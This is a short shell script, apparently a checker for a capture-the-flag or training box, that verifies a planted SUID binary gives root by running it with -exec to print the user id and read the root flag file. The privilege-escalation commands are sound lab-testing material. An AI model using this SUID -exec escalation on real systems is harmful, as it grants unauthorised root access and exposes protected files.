#!/bin/sh
# Prove the SUID binary really escalates: run it as the foothold user and read
# the root flag.
set -eu
bin="/usr/local/bin/${BOX_BINARY:?BOX_BINARY is not set}"
uid=$("$bin" /root/root.txt -exec id -u \; 2>/dev/null | tr -d '[:space:]')
[ "$uid" = "0" ] || { echo "SUID binary did not give root (uid=$uid)" >&2; exit 1; }
"$bin" /root/root.txt -exec cat {} \; | grep -q 'FLAG{root-' \
    || { echo "root.txt not readable via SUID binary" >&2; exit 1; }
echo "root achieved via SUID $BOX_BINARY"
